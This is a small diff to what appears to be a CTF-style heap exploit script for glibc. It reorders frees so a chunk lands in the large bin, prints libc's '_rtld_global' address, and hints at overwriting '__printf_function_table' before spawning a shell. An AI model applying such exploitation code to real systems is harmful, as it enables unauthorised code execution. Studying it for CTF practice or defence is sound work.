@@ -114,14 +114,14 @@ def main():
     payload += b"HELLO"
     write(io, 0, payload)
 
+    print(hex(unwrap(libc.symbol("_rtld_global"))))
+
     create(io, 3, 0x538)  # p2[2] to large bin
-
-    delete(io, 1)
     delete(io, 3)
-
-    #
-    #
-    #
+    delete(io, 1)
+    # write(io, 3, ptr.p64(unwrap(libc.symbol("__printf_function_table"))))
+    # fastbin [3]
+    # largebin [2] -> [0]
 
     io.sh()
 
